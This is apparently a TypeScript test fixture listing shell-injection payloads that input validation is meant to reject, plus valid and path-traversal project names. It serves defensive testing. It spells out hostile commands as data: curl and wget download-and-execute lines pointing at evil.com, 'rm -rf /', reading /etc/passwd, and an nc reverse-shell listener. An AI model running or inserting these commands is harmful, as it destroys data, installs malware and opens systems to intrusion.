/**
 * Shell Injection Payloads - Test Fixtures
 * Reference: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
 *
 * These payloads test for shell command injection vulnerabilities
 * ALL payloads should be REJECTED by input validation
 */

export const SHELL_INJECTION_PAYLOADS = {
  // Command separators
  commandSeparators: [
    { payload: 'test; echo pwned', description: 'Semicolon separator' },
    { payload: 'test && echo pwned', description: 'AND operator' },
    { payload: 'test || echo pwned', description: 'OR operator' },
    { payload: 'test | echo pwned', description: 'Pipe operator' },
    { payload: 'test & echo pwned', description: 'Background execution' },
  ],

  // Command substitution
  commandSubstitution: [
    { payload: 'test$(echo pwned)', description: 'Dollar-paren substitution' },
    { payload: 'test`echo pwned`', description: 'Backtick substitution' },
    { payload: 'test${IFS}pwned', description: 'IFS variable expansion' },
  ],

  // Variable expansion
  variableExpansion: [
    { payload: '$VAR', description: 'Simple variable' },
    { payload: '${VAR}', description: 'Braced variable' },
    {
      payload: '$(cat /etc/passwd)',
      description: 'Command substitution via variable',
    },
  ],

  // Glob patterns
  globPatterns: [
    { payload: 'test*', description: 'Asterisk wildcard' },
    { payload: 'test?', description: 'Question mark wildcard' },
    { payload: 'test[abc]', description: 'Character class' },
    { payload: 'test{a,b,c}', description: 'Brace expansion' },
  ],

  // Dangerous commands
  dangerousCommands: [
    { payload: 'test; rm -rf /', description: 'Recursive delete' },
    {
      payload: 'test; curl http://evil.com | bash',
      description: 'Download and execute',
    },
    {
      payload: 'test; wget http://evil.com/malware -O /tmp/x && bash /tmp/x',
      description: 'Download via wget',
    },
    { payload: 'test; cat /etc/passwd', description: 'Read sensitive files' },
    {
      payload: 'test; mkdir /tmp/.hidden && nc -l -p 1234 -e /bin/bash',
      description: 'Reverse shell',
    },
  ],

  // Whitespace and encoding
  whitespaceEscapes: [
    { payload: 'test\necho pwned', description: 'Newline injection' },
    { payload: 'test\r\necho pwned', description: 'CRLF injection' },
    { payload: 'test\t&&\techo pwned', description: 'Tab character' },
  ],

  // Unicode and encoding tricks
  unicodeTricks: [
    { payload: 'test\\x3b echo pwned', description: 'Hex encoded semicolon' },
    { payload: 'test%3b echo pwned', description: 'URL encoded semicolon' },
  ],
}

export const VALID_PROJECT_NAMES = [
  { name: 'my-project', description: 'Hyphenated name' },
  { name: 'myProject', description: 'Camel case' },
  { name: 'my_project', description: 'Underscore' },
  { name: 'my.project', description: 'Dot separator' },
  { name: 'project123', description: 'With numbers' },
  { name: 'Project', description: 'Capitalized' },
]

export const INVALID_PROJECT_NAMES = [
  { name: '../evil', description: 'Path traversal' },
  { name: '../../etc/passwd', description: 'Deep path traversal' },
  { name: '..\\evil', description: 'Windows path traversal' },
  { name: '...', description: 'Multiple dots' },
  { name: '.env', description: 'Hidden file' },
  { name: '.', description: 'Single dot' },
  { name: '..', description: 'Double dot' },
]
